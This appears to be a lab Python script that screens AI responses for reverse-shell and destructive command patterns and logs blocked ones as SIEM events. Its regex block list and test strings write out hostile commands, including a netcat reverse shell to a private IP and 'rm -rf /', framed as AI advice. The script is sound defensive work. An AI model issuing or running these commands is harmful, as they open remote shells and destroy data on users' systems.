#!/usr/bin/env python3
"""
AI Output Sanitization & Malicious Code Defense Gateway
Environment: lab.local (siem01)
Framework Mapping: OWASP LLM05 (Improper Output Handling), STRIDE (Tampering / Elevation of Privilege)
"""

import re
import json
from datetime import datetime

LOG_FILE = "/var/log/ai_guardrail.json"

# Dangerous output signatures (Reverse shells, destructive commands)
DANGEROUS_OUTPUT_PATTERNS = [
    r"nc\s+-e\s+/bin/(sh|bash)",
    r"bash\s+-i\s+>&\s+/dev/tcp/",
    r"python3?\s+-c\s+['\"].*import\s+socket.*subprocess['\"]",
    r"rm\s+-rf\s+/\s*",
    r"chmod\s+777\s+/etc/"
]

def log_siem_event(user, event_type, severity, snippet, detail):
    entry = {
        "timestamp": datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"),
        "domain": "lab.local",
        "component": "AI_Output_Sanitizer",
        "source_user": user,
        "event_type": event_type,
        "severity": severity,
        "payload_snippet": snippet[:80],
        "detail": detail
    }
    json_output = json.dumps(entry)
    print(json_output)
    try:
        with open(LOG_FILE, "a") as lf:
            lf.write(json_output + "\n")
    except PermissionError:
        pass

def sanitize_ai_output(user, response_text):
    for pattern in DANGEROUS_OUTPUT_PATTERNS:
        if re.search(pattern, response_text, re.IGNORECASE):
            log_siem_event(
                user=user,
                event_type="OWASP_LLM05_IMPROPER_OUTPUT_HANDLING",
                severity="CRITICAL",
                snippet=response_text,
                detail=f"Blocked dangerous execution payload in AI response matching pattern: '{pattern}'"
            )
            print(f"[SECURITY BLOCK] Malicious execution payload detected in AI response and sanitized.\n")
            return False, "[SANITIZED] Response withheld due to dangerous execution signatures."
    
    log_siem_event(
        user=user,
        event_type="AI_OUTPUT_CLEARED",
        severity="INFO",
        snippet=response_text,
        detail="AI response verified safe for user rendering."
    )
    print(f"[SAFE] AI response rendered successfully.\n")
    return True, "[RENDERED] Safe AI response delivered."

if __name__ == "__main__":
    print("=== Testing lab.local AI Output Sanitization Gateway ===\n")

    test_responses = [
        ("LAB\\it_admin", "To restart the web service on the portal, run: sudo systemctl restart apache2"),
        ("LAB\\dev_user", "You can test connectivity using a netcat shell: nc -e /bin/sh 192.168.6.99 4444"),
        ("LAB\\hr_user", "To clear temporary system storage across the host, execute: rm -rf /")
    ]

    for user, resp in test_responses:
        print(f"[Testing AI Output] User: {user} | Response: '{resp}'")
        allowed, msg = sanitize_ai_output(user, resp)
        print(f"[Gateway Verdict] {msg}\n" + "-"*50)
